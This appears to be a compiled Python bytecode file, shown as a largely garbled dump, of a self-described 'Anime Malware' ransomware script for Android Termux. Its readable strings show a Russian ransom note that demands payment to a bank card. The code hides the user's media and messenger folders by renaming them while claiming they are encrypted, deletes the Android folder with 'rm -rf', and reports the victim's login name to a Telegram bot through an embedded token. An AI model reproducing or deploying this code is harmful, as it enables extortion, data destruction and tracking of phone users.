a
    ??`?  ?                   @   s?   d dl Z d dlZd dlZd dlmZmZ ejej Zejej	 Z
ejej Zed e d e d Zed Zdd? Ze?  d	d
? Zdd? Ze?  dS )?    N)?Fore?Styleu?   
╭╮╭━╮╱╱╱╱╱╱╱╭━━╮
┃┃┃╭╯╱╱╱╱╱╱╱┃╭╮┃
┃╰╯╯╭╮╱╭┳╮╭╮┃╰╯╰┳━━┳╮╱╭╮       zCreator by Anibeyu?  
┃╭╮┃┃┃╱┃┃┃┃┃┃╭━╮┃┃━┫┃╱┃┃     Anime Malware 
┃┃┃╰┫╰━╯┃╰╯┃┃╰━╯┃┃━┫╰━╯┃  -–——————————————––—
╰╯╰━┻━╮╭┻━━╯╰━━━┻━━┻━╮╭╯      Version 1.0
╱╱╱╱╭━╯┃╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
╱╱╱╱╰━━╯╱╱╱╱╱╱╱╱╱╱╱╰━━╯u?   ———––——————————————————————————————————————————————————––———c                   C   s?  t t? t?d? t t? t d? t td t d t d t d ? t d? t td ? t td ? t d? t t? t td	 t d
 t d t d t d t d t d ? t d? t td t d t d ? t?	d? t td t d t d ? t?	d? t td t d t d ? t?	d? t td t d t d ? t?	d? t t? t?d? t?d? t td t d t d ? d S ) N?clear? uQ   Приветсвутю, вы установили вирус вымогательz Kyubeyut   , данный вирус шифрует главные директории внутри вашей системы.u;    Зашифрованы данные директории: z.          DCIM   Download   Documents   Moviesz*          Music  Pictures   Telegram    VKu}   Для расшифровки данных оплатите 249₽ на банковскую карту, либо через Z24u    часа директорияz	 Android u:   удалится. Реквизиты для оплаты: z4890 4947 2494 5399u    всего доброго.u&   До удаления осталосьz 24u    часа...i?p  z 16u    часов...z 8i(n  z 10u    минут...iX  ?8cd && cd /data/data/com.termux/files/home/storage/sharedzrm -rf Androidu   Папка zAndroid u   удалена...)
?print?banner?os?system?w?r?g?line?time?sleep? r   r   ?&/storage/emulated/0/Download/kyubey.py?main_bey   s0    
$<





r   c                  C   sn   t ?d? t ?d? t ?? } d}d}d}d}|d | | }t?d| d	 | d
 |  ? t?d? t?  d S )Nr   z?mv DCIM .DCQS && mv Download .DOQS && mv Documents .DQS && mv Movies .MQS && mv Music .MUQS && mv Pictures .PQS && mv Telegram .TQS && mv VK .VQSZ
1680914104Z
1825869178ZAAFPf04sznPsgPzUZvCcMMdHPbDMjdhMjDqI?:zhttps://api.telegram.org/botz/sendMessage?chat_id=uJ   &text=Зарегистрирован новый пользователь: zhttps://ezstat.ru/2GzmY6)r	   r
   ?getlogin?requests?getr   )?name?idZidbotZhash1botZhash2bot?tokenr   r   r   ?hash_bey=   s    


r   c                   C   s
   t ?  d S )N)r   r   r   r   r   ?	start_beyQ   s    r   )r   r	   r   Zcoloramar   r   ZBRIGHTZWHITEr   ZGREENr   ZREDr   r   r   r   r   r   r   r   r   r   ?<module>   s&   ????
"